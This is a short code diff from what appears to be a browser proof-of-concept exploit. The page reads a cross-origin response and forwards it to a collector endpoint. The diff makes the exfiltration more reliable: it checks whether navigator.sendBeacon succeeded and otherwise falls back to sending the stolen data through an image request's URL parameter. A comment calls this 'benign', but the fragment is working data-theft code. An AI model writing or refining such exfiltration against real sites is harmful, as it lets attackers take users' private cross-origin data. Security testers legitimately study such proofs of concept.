@@ -23,9 +23,11 @@
     .then(data => {
       document.getElementById("out").textContent =
         "Read cross-origin response (" + data.length + " bytes). Sent to collector.";
-      // benign exfil to your own collector:
-      try { navigator.sendBeacon(COLLECT, data); }
-      catch (e) { new Image().src = COLLECT + "?d=" + encodeURIComponent(data); }
+      // benign exfil to your own collector.
+      // NOTE: sendBeacon returns FALSE on failure/oversize (it does NOT throw) — check the return, else fall back.
+      var ok = false;
+      try { ok = navigator.sendBeacon(COLLECT, data); } catch (e) { ok = false; }
+      if (!ok) { new Image().src = COLLECT + "?d=" + encodeURIComponent(data); }
     })
     .catch(err => {
       document.getElementById("out").textContent =
